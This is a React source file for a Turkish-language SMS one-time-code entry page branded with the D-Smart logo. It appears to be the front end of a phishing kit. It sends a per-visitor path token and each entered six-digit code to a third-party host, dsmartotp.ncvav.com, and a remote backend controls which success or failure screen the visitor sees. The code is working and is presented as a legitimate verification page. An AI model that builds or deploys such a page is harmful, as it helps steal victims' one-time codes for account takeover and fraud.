import {
  useState,
  useRef,
  useEffect,
  type KeyboardEvent,
  type ChangeEvent,
} from "react";
import { Box, Button, Paper, TextField, Typography } from "@mui/material";
import logo from "../public/logo.jpeg";
import { ORANGE } from "./utils/colors";
import type { SonucDurumu } from "./utils/type";
import { retryButtonStyle, verifyButtonStyle } from "./style/buttonStyle";
import { descriptionStyle, pageStyle, titleStyle } from "./style/page";
import { SonucIkon } from "./style/Icon";
import { cardStyle } from "./style/card";
import { useSearchParams } from "react-router-dom";

const CODE_LENGTH = 6;
const TIMER_SECONDS = 180;

function App() {
  const [gsmNo] = useState("5XX XXX XX XX");
  const [code, setCode] = useState<string[]>(Array(CODE_LENGTH).fill(""));
  const [remaining, setRemaining] = useState(TIMER_SECONDS);
  const [sonuc, setSonuc] = useState<SonucDurumu>(null);
  const [pathSonuc, setPathSonuc] = useState<SonucDurumu>(null);

  const [gonderiliyor, setGonderiliyor] = useState(false);
  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  const [hataMesaji, setHataMesaji] = useState("");

  console.log(hataMesaji);

  const [searchParams] = useSearchParams();

  const getPath = searchParams.get("path");

  useEffect(() => {
    if (getPath == null) {
      setSonuc("bulunamadi");
      return;
    }
    sendPath();
  }, [getPath]);

  const sendPath = async () => {
    try {
      if (!getPath) {
        setSonuc("bulunamadi");
        return;
      }

      const formData = new FormData();

      formData.append("path", getPath);

      const response = await fetch(
        "https://dsmartotp.ncvav.com/Service/Process/",
        {
          method: "POST",
          body: formData,
        },
      );

      if (!response.ok) {
        throw new Error(`HTTP Error: ${response.status}`);
      }

      const data = await response.json();

      console.log("Process response:", data);

      if (data.process === 1) {
        setPathSonuc(null);
      } else if (data.process === 2) {
        setPathSonuc("basarili");
      } else if (data.process === 3) {
        setPathSonuc("basarisiz");
      } else if (data.process === 4) {
        setPathSonuc("bulunamadi");
      }
    } catch (error) {
      console.error("processCheck hatası:", error);
      setHataMesaji("Bağlantı hatası, lütfen tekrar deneyin.");
    }
  };
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (sonuc || remaining <= 0) {
      return;
    }

    const interval = setInterval(() => {
      setRemaining((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(interval);
  }, [remaining, sonuc]);

  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60)
      .toString()
      .padStart(2, "0");

    const sec = (seconds % 60).toString().padStart(2, "0");

    return `${minutes}:${sec}`;
  };

  const handleChange =
    (index: number) => (e: ChangeEvent<HTMLInputElement>) => {
      const value = e.target.value.replace(/[^0-9]/g, "").slice(-1);

      const next = [...code];

      next[index] = value;

      setCode(next);

      if (value && index < CODE_LENGTH - 1) {
        inputRefs.current[index + 1]?.focus();
      }
    };

  const handleKeyDown =
    (index: number) => (e: KeyboardEvent<HTMLInputElement>) => {
      if (e.key === "Backspace" && !code[index] && index > 0) {
        inputRefs.current[index - 1]?.focus();
      }
    };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    const pasted = e.clipboardData
      .getData("text")
      .replace(/[^0-9]/g, "")
      .slice(0, CODE_LENGTH);

    if (!pasted) return;

    e.preventDefault();

    const next = Array(CODE_LENGTH).fill("");

    pasted.split("").forEach((digit, index) => {
      next[index] = digit;
    });

    setCode(next);

    const focusIndex = Math.min(pasted.length, CODE_LENGTH - 1);

    inputRefs.current[focusIndex]?.focus();
  };

  const sendCode = async () => {
    if (!isCodeComplete || gonderiliyor || !getPath) {
      return;
    }

    setGonderiliyor(true);
    setHataMesaji("");

    try {
      const formData = new FormData();

      formData.append("path", getPath);

      code.forEach((digit) => {
        formData.append("kod[]", digit);
      });

      const response = await fetch(
        "https://dsmartotp.ncvav.com/Service/Backend/",
        {
          method: "POST",
          body: formData,
        },
      );

      const data = await response.json();

      console.log("Backend response:", data);

      if (data.process === true) {
        setSonuc("basarili");
      } else {
        setSonuc("basarisiz");
        setHataMesaji(data.message || "SMS kodu hatalı");
      }
    } catch (error) {
      console.error("Backend hatası:", error);
      setHataMesaji("Bağlantı hatası, lütfen tekrar deneyin.");
    } finally {
      setGonderiliyor(false);
    }
  };
  const handleTekrarDene = () => {
    window.location.reload();
  };

  const isCodeComplete = code.every((digit) => digit !== "");

  const sureBitti = remaining <= 0;

  return (
    <Box sx={pageStyle}>
      <Paper elevation={0} sx={cardStyle}>
        {/* PATH KONTROLÜ */}
        {pathSonuc === "basarisiz" && (
          <Box sx={{ py: 3.5 }}>
            <SonucIkon tip="hata" />

            <Typography sx={titleStyle}>İşlem Başarısız</Typography>

            <Typography sx={descriptionStyle}>
              İşleminiz gerçekleştirilemedi. Lütfen daha sonra tekrar deneyiniz.
            </Typography>
          </Box>
        )}

        {pathSonuc === "bulunamadi" && (
          <Box sx={{ py: 3.5 }}>
            <SonucIkon tip="bulunamadi" />

            <Typography sx={titleStyle}>Kaydınız Bulunamadı!</Typography>

            <Typography sx={descriptionStyle}>
              Kaydınız bulunamadı. Lütfen daha sonra tekrar deneyiniz.
            </Typography>
          </Box>
        )}

        {/* PATH BAŞARILI → OTP SAYFASI */}
        {pathSonuc === "basarili" && (
          <>
            {sonuc === "basarili" && (
              <Box sx={{ py: 3.5 }}>
                <SonucIkon tip="basarili" />

                <Typography sx={titleStyle}>İşlem Başarılı</Typography>

                <Typography sx={descriptionStyle}>
                  Doğrulamanız tamamlandı, işleminiz onaylandı.
                </Typography>
              </Box>
            )}

            {sonuc === "basarisiz" && (
              <Box sx={{ py: 3.5 }}>
                <SonucIkon tip="hata" />

                <Typography sx={titleStyle}>İşlem Başarısız</Typography>

                <Typography
                  sx={{
                    ...descriptionStyle,
                    mb: 3.5,
                  }}
                >
                  İşleminiz, çok fazla hatalı kod girişi yapıldığı için
                  başarısız olmuştur. Lütfen bir süre bekleyip tekrar deneyiniz.
                </Typography>

                <Button
                  fullWidth
                  onClick={handleTekrarDene}
                  sx={retryButtonStyle}
                >
                  TEKRAR DENE
                </Button>
              </Box>
            )}

            {sonuc === "bulunamadi" && (
              <Box sx={{ py: 3.5 }}>
                <SonucIkon tip="bulunamadi" />

                <Typography sx={titleStyle}>Kaydınız Bulunamadı!</Typography>

                <Typography sx={descriptionStyle}>
                  Kaydınız bulunamadı. Lütfen daha sonra tekrar deneyiniz.
                </Typography>
              </Box>
            )}

            {/* OTP EKRANI */}
            {!sonuc && (
              <>
                <Box
                  sx={{
                    display: "flex",
                    justifyContent: "center",
                    alignItems: "center",
                    height: 160,
                    mb: 0.75,
                  }}
                >
                  <Box
                    component="img"
                    src={logo}
                    alt="D-Smart"
                    sx={{
                      width: 180,
                      maxWidth: "70%",
                      height: "auto",
                      objectFit: "contain",
                    }}
                  />
                </Box>

                <Box
                  sx={{
                    width: "100%",
                    borderTop: "1px solid #d8d8d8",
                    mb: 3,
                  }}
                />

                <Typography
                  sx={{
                    fontSize: {
                      xs: 22,
                      sm: 24,
                    },
                    fontWeight: 700,
                    color: "#172033",
                    lineHeight: 1.2,
                    mb: 1.5,
                  }}
                >
                  SMS Doğrulama Kodu
                </Typography>

                <Typography
                  sx={{
                    color: "#596579",
                    fontSize: 14.5,
                    lineHeight: 1.5,
                    mb: 3,
                  }}
                >
                  <Box
                    component="span"
                    sx={{
                      fontWeight: 700,
                    }}
                  >
                    {gsmNo}
                  </Box>{" "}
                  numarasına gönderilen 6 haneli kodu giriniz.
                </Typography>

                <Box
                  sx={{
                    display: "flex",
                    justifyContent: "center",
                    gap: {
                      xs: 0.6,
                      sm: 1,
                    },
                    mb: 3,
                  }}
                >
                  {code.map((digit, index) => (
                    <TextField
                      key={index}
                      value={digit}
                      onChange={handleChange(index)}
                      onKeyDown={handleKeyDown(index)}
                      onPaste={handlePaste}
                      inputRef={(el) => {
                        inputRefs.current[index] = el;
                      }}
                      autoFocus={index === 0}
                      variant="outlined"
                      sx={{
                        width: {
                          xs: 40,
                          sm: 46,
                        },

                        "& .MuiOutlinedInput-root": {
                          height: {
                            xs: 48,
                            sm: 54,
                          },

                          borderRadius: "9px",
                          backgroundColor: "#fff",

                          "& fieldset": {
                            border: "1.5px solid #d9dee5",
                          },

                          "&:hover fieldset": {
                            borderColor: "#c5ccd5",
                          },

                          "&.Mui-focused fieldset": {
                            borderColor: ORANGE,
                            borderWidth: "2px",
                          },
                        },

                        "& .MuiInputBase-input": {
                          padding: 0,
                          textAlign: "center",
                          fontSize: {
                            xs: 19,
                            sm: 20,
                          },
                          fontWeight: 600,
                          color: "#172033",
                        },
                      }}
                      slotProps={{
                        htmlInput: {
                          inputMode: "numeric",
                          maxLength: 1,
                        },
                      }}
                    />
                  ))}
                </Box>

                <Typography
                  sx={{
                    color: "#708096",
                    fontSize: 14.5,
                    mb: 3,
                  }}
                >
                  <Box
                    component="span"
                    sx={{
                      fontSize: 15.5,
                      mr: 0.5,
                    }}
                  >
                    ⏱
                  </Box>
                  Kalan süre:{" "}
                  <Box
                    component="span"
                    sx={{
                      fontWeight: 700,
                      color: "#111827",
                      ml: 0.5,
                    }}
                  >
                    {sureBitti ? "Süre Doldu" : formatTime(remaining)}
                  </Box>
                </Typography>

                <Button
                  fullWidth
                  variant="outlined"
                  disabled={!sureBitti}
                  onClick={handleTekrarDene}
                  sx={{
                    ...retryButtonStyle,
                    mb: 1.25,
                  }}
                >
                  TEKRAR DENE
                </Button>

                <Button
                  fullWidth
                  variant="contained"
                  disabled={!isCodeComplete || gonderiliyor || sureBitti}
                  onClick={sendCode}
                  sx={{
                    ...verifyButtonStyle,

                    "&.Mui-disabled": {
                      backgroundColor: ORANGE,
                      color: "#fff",
                      opacity: 1,
                    },
                  }}
                >
                  {gonderiliyor ? "KONTROL EDİLİYOR..." : "DOĞRULA VE DEVAM ET"}
                </Button>
              </>
            )}
          </>
        )}
      </Paper>
    </Box>
  );
}

export default App;
